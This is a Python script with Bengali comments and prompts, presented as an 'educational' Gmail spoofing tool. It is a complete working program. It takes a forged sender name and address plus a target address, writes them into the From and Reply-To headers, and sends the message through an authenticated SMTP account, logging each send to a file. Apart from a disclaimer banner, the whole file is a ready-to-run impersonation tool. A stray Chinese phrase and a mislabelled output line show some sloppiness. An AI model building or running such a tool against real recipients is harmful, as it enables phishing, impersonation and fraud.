
"""
Gmail Spoofing ডেমো টুল - শুধু শিক্ষামূলক উদ্দেশ্যে
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
import getpass
import os
import sys
from datetime import datetime

# রঙিন আউটপুটের জন্য try-except (colorama না থাকলেও কাজ করবে)
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLOR_ENABLED = True
except ImportError:
    COLOR_ENABLED = False
    # ডামি ক্লাস তৈরি করছি
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

def print_colored(text, color=Fore.WHITE, style=Style.NORMAL):
    """রঙিন প্রিন্ট ফাংশন"""
    if COLOR_ENABLED:
        print(f"{style}{color}{text}{Style.RESET_ALL}")
    else:
        print(text)

def clear_screen():
    """স্ক্রিন ক্লিয়ার ফাংশন"""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """ব্যানার দেখান"""
    banner = f"""
{Fore.RED}{Style.BRIGHT}
    ╔══════════════════════════════════════════╗
    ║     GMAIL স্পুফিং টুল (শিক্ষামূলক)       ║
    ║         ইমেল সিকিউরিটি ডেমো              ║
    ╚══════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}[!] সতর্কতা: এই টুল শুধু শিক্ষামূলক উদ্দেশ্যে
[!] অনুমতি ছাড়া ব্যবহার করা আইনত দণ্ডনীয় অপরাধ{Style.RESET_ALL}
    """
    print(banner)

def get_email_content():
    """ইমেল কন্টেন্ট ইনপুট নেওয়ার ফাংশন"""
    print_colored("\n📧 ইমেল তথ্য দিন:", Fore.CYAN, Style.BRIGHT)
    
    # স্পুফ করা তথ্য
    spoofed_name = input(f"{Fore.GREEN}[+] স্পুফ করা নাম (যে নাম দেখাবে): {Style.RESET_ALL}")
    spoofed_email = input(f"{Fore.GREEN}[+] স্পুফ করা ইমেল (যে ইমেল থেকে এসেছে বলে দেখাবে): {Style.RESET_ALL}")
    
    # টার্গেট তথ্য
    target_email = input(f"{Fore.GREEN}[+] টার্গেট ইমেল (যেখানে পাঠাবেন): {Style.RESET_ALL}")
    
    # ইমেল সাবজেক্ট ও বডি
    subject = input(f"{Fore.GREEN}[+] ইমেল সাবজেক্ট: {Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] ইমেল বডি লিখুন (একাধিক লাইনের জন্য Enter চাপুন, শেষে CTRL+D বা খালি Enter):{Style.RESET_ALL}")
    
    lines = []
    while True:
        try:
            line = input()
            if line == "" and len(lines) > 0:
                break
            lines.append(line)
        except EOFError:
            break
    
    message_body = "\n".join(lines)
    
    return {
        'spoofed_name': spoofed_name,
        'spoofed_email': spoofed_email,
        'target_email': target_email,
        'subject': subject,
        'body': message_body
    }

def get_smtp_settings():
    """SMTP সেটিংস ইনপুট নেওয়ার ফাংশন"""
    print_colored("\n🔧 SMTP সেটিংস:", Fore.CYAN, Style.BRIGHT)
    
    print_colored("[*] সাধারণ SMTP সার্ভার:", Fore.WHITE)
    print_colored("    Gmail: smtp.gmail.com:587", Fore.YELLOW)
    print_colored("    Yahoo: smtp.mail.yahoo.com:587", Fore.YELLOW)
    print_colored("    Outlook: smtp-mail.outlook.com:587", Fore.YELLOW)
    print_colored("   你自己的: আপনার নিজের SMTP সার্ভার", Fore.YELLOW)
    
    smtp_server = input(f"{Fore.GREEN}[+] SMTP সার্ভার (ডিফল্ট: smtp.gmail.com): {Style.RESET_ALL}") or "smtp.gmail.com"
    smtp_port = input(f"{Fore.GREEN}[+] SMTP পোর্ট (ডিফল্ট: 587): {Style.RESET_ALL}") or "587"
    
    try:
        smtp_port = int(smtp_port)
    except ValueError:
        print_colored("[-] ভুল পোর্ট নম্বর! 587 ব্যবহার করা হবে।", Fore.RED)
        smtp_port = 587
    
    # আসল অ্যাকাউন্টের তথ্য
    real_email = input(f"{Fore.GREEN}[+] আপনার আসল ইমেল (যে অ্যাকাউন্ট থেকে পাঠাবেন): {Style.RESET_ALL}")
    password = getpass.getpass(f"{Fore.GREEN}[+] আপনার অ্যাপ পাসওয়ার্ড (টাইপ করার সময় দেখা যাবে না): {Style.RESET_ALL}")
    
    return {
        'server': smtp_server,
        'port': smtp_port,
        'real_email': real_email,
        'password': password
    }

def create_spoof_email(spoof_info, smtp_info):
    """স্পুফ করা ইমেল তৈরি করার ফাংশন"""
    
    # ইমেল মেসেজ তৈরি
    msg = MIMEMultipart()
    
    # স্পুফ করা From হেডার
    msg["From"] = f"{spoof_info['spoofed_name']} <{spoof_info['spoofed_email']}>"
    msg["To"] = spoof_info['target_email']
    msg["Subject"] = spoof_info['subject']
    
    # অতিরিক্ত হেডার (বাস্তবতার জন্য)
    msg["Reply-To"] = spoof_info['spoofed_email']
    msg["X-Priority"] = "3"  # নরমাল প্রায়োরিটি
    
    # তারিখ যোগ করা
    msg["Date"] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S %z")
    
    # মেসেজ বডি যোগ
    msg.attach(MIMEText(spoof_info['body'], 'plain'))
    
    # অতিরিক্ত: HTML ভার্সন যোগ করতে চাইলে
    # html_body = f"<html><body><p>{spoof_info['body']}</p></body></html>"
    # msg.attach(MIMEText(html_body, 'html'))
    
    return msg

def send_email(msg, smtp_info, spoof_info):
    """ইমেল পাঠানোর ফাংশন"""
    
    try:
        print_colored("\n📤 ইমেল পাঠানোর চেষ্টা করা হচ্ছে...", Fore.YELLOW)
        
        # SMTP সার্ভারে কানেক্ট
        server = smtplib.SMTP(smtp_info['server'], smtp_info['port'])
        server.set_debuglevel(0)  # 1 করলে ডিটেইলস দেখা যাবে
        
        # TLS স্টার্ট
        server.starttls()
        print_colored("[*] TLS সংযোগ স্থাপিত", Fore.CYAN)
        
        # লগইন
        print_colored("[*] সার্ভারে লগইন করা হচ্ছে...", Fore.CYAN)
        server.login(smtp_info['real_email'], smtp_info['password'])
        print_colored("[+] লগইন সফল!", Fore.GREEN)
        
        # ইমেল পাঠানো
        print_colored("[*] ইমেল পাঠানো হচ্ছে...", Fore.CYAN)
        server.sendmail(smtp_info['real_email'], 
                       spoof_info['target_email'], 
                       msg.as_string())
        
        print_colored("\n[✓] ইমেল সফলভাবে পাঠানো হয়েছে!", Fore.GREEN, Style.BRIGHT)
        print_colored(f"[✓] থেকে: {spoof_info['spoofed_name']} <{spoof_info['spoofed_email']}>", Fore.GREEN)
        print_colored(f"[✓] থেকে: {spoof_info['target_email']}", Fore.GREEN)
        
        # সার্ভার বন্ধ
        server.quit()
        
    except smtplib.SMTPAuthenticationError:
        print_colored("\n[-] লগইন ত্রুটি! ইমেল ও পাসওয়ার্ড চেক করুন।", Fore.RED, Style.BRIGHT)
        print_colored("[*] মনে রাখবেন: Gmail-এর জন্য অ্যাপ পাসওয়ার্ড ব্যবহার করতে হবে!", Fore.YELLOW)
    except smtplib.SMTPException as e:
        print_colored(f"\n[-] SMTP ত্রুটি: {str(e)}", Fore.RED)
    except Exception as e:
        print_colored(f"\n[-] অজানা ত্রুটি: {str(e)}", Fore.RED)

def save_email_log(msg, spoof_info):
    """ইমেল লগ সেভ করার ফাংশন"""
    
    try:
        with open("email_log.txt", "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"সময়: {datetime.now()}\n")
            f.write(f"From: {spoof_info['spoofed_name']} <{spoof_info['spoofed_email']}>\n")
            f.write(f"To: {spoof_info['target_email']}\n")
            f.write(f"Subject: {spoof_info['subject']}\n")
            f.write(f"Body: {spoof_info['body']}\n")
            f.write(f"{'='*50}\n")
        print_colored("[*] ইমেল লগ সেভ করা হয়েছে (email_log.txt)", Fore.CYAN)
    except:
        pass

def main():
    """মেইন ফাংশন"""
    
    clear_screen()
    show_banner()
    
    # প্রথমে colorama ইন্সটল করা আছে কিনা চেক
    if not COLOR_ENABLED:
        print_colored("\n[*] টিপস: colorama ইন্সটল করলে রঙিন আউটপুট পাবেন:", Fore.YELLOW)
        print_colored("    pip install colorama", Fore.CYAN)
    
    try:
        # SMTP সেটিংস নিন
        smtp_info = get_smtp_settings()
        
        # ইমেল কন্টেন্ট নিন
        spoof_info = get_email_content()
        
        # সব তথ্য দেখান
        print_colored("\n📋 সারাংশ:", Fore.CYAN, Style.BRIGHT)
        print_colored(f"   স্পুফ করা From: {spoof_info['spoofed_name']} <{spoof_info['spoofed_email']}>", Fore.WHITE)
        print_colored(f"   টার্গেট: {spoof_info['target_email']}", Fore.WHITE)
        print_colored(f"   সাবজেক্ট: {spoof_info['subject']}", Fore.WHITE)
        print_colored(f"   SMTP সার্ভার: {smtp_info['server']}:{smtp_info['port']}", Fore.WHITE)
        
        # কনফার্মেশন
        confirm = input(f"\n{Fore.RED}[?] কি ইমেল পাঠাবেন? (yes/no): {Style.RESET_ALL}").lower()
        
        if confirm == 'yes' or confirm == 'y':
            # ইমেল তৈরি করুন
            msg = create_spoof_email(spoof_info, smtp_info)
            
            # ইমেল পাঠান
            send_email(msg, smtp_info, spoof_info)
            
            # লগ সেভ করুন
            save_email_log(msg, spoof_info)
        else:
            print_colored("\n[-] ইমেল পাঠানো বাতিল করা হয়েছে।", Fore.YELLOW)
            
    except KeyboardInterrupt:
        print_colored("\n\n[-] প্রোগ্রাম বন্ধ করা হয়েছে।", Fore.YELLOW)
    except Exception as e:
        print_colored(f"\n[-] অপ্রত্যাশিত ত্রুটি: {str(e)}", Fore.RED)
    
    print_colored("\n✨ প্রোগ্রাম শেষ।", Fore.CYAN)

if __name__ == "__main__":
    main()